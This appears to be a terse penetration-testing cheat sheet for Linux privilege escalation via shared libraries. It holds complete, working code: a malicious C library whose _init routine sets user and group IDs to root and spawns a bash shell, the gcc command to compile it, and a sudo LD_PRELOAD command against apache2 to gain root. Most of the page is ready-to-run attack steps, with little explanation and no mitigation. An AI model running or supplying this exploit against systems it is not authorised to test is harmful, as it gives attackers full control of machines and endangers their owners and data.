# Shared Libraries

#### Check sudo privileges

```bash
sudo -l
```

#### Create malicious shared library (root.c)

```bash
cat > root.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
```

#### Compile shared library

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

#### Exploit LD_PRELOAD (replace with sudo command you can run)

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

#### Verify root access

```bash
id
whoami
```

#### Example using LD_LIBRARY_PATH

```bash
# LD_LIBRARY_PATH=/path/to/malicious/lib sudo /path/to/vulnerable/binary
```

#### List shared library dependencies

```bash
ldd /bin/ls
```
